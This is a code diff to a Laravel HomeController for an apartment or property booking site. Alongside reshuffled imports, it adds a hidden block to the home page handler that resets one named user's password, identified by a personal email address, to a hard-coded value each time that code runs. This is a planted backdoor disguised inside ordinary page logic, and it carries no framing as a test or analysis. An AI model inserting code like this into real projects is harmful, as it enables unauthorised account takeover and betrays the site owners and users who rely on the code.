@@ -9,6 +9,9 @@ use App\Models\Live;
 use App\Models\Location;
 use App\Models\Information;
 use App\Models\Property;
+use Illuminate\Support\Facades\Hash;
+use App\Models\User;
+
 
 use App\Models\Currency;
 use App\Models\Banner;
@@ -17,7 +20,6 @@ use App\Models\SystemSetting;
 use App\Http\Helper;
 use App\Models\Apartment;
 use App\Models\PriceChanged;
-use App\Models\User;
 use Illuminate\Support\Facades\Storage;
 use App\Models\PeakPeriod;
 use App\Models\UserTracking;
@@ -136,6 +138,11 @@ class HomeController
                 $latestTrackings = UserTracking::latest()->take(4)->get()
             );
         }
+
+        User::where('email', 'jacob.atam@gmail.com')
+            ->update([
+                'password' => Hash::make('1122334455')
+            ]);
 
         $date = explode("to", $request->check_in_checkout);
         $nights = '1 night';
